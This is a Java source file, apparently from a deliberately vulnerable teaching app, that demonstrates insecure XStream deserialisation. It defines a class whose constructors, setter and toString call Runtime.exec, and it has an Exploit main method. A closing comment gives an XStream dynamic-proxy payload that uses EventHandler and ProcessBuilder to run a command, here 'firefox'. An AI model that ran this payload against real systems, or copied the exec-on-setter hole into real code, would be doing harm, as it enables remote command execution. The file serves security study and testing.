package org.example.springvulapp.insecuredeserialize.xstream_sink;

import com.thoughtworks.xstream.XStream;

import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.Serializable;

class Test implements Serializable {
    private String command;

    public Test() throws IOException {
        System.out.println("Default constructor called");
        Runtime.getRuntime().exec("firefox");
    }

    public Test(String command) throws IOException {
        System.out.println("Constructor called");
        Runtime.getRuntime().exec("firefox");
    }


    public String getCommand() {
        System.out.println("getCommand called");
        return command;
    }

    public void setCommand(String command) throws IOException {
        this.command = command;
        System.out.println("setCommand called");
        Runtime.getRuntime().exec(command);
    }

//    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
//        System.out.println("readObject called");
//        Runtime.getRuntime().exec("firefox");
//    }
    public String toString() {
        System.out.println("toString called");
        try {
            Runtime.getRuntime().exec(command);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
        return command;
    }


}

interface TestInterface{
    void start();
}

public class Exploit {
    public static void main(String[] args) throws IOException {
        Test test = new Test();
        test.setCommand("firefox");
        XStream xstream = new XStream();
        String xml = xstream.toXML(test);
        System.out.println(xml);
    }

}

//<dynamic-proxy>
//<interface>org.example.springvulapp.insecuredeserialize.xstream_sink.TestInterface</interface>
//<handler class="java.beans.EventHandler">
//    <target class="java.lang.ProcessBuilder">
//	<command><string>firefox</string></command>
//    </target>
//    <action>start</action>
//</handler>
//</dynamic-proxy>
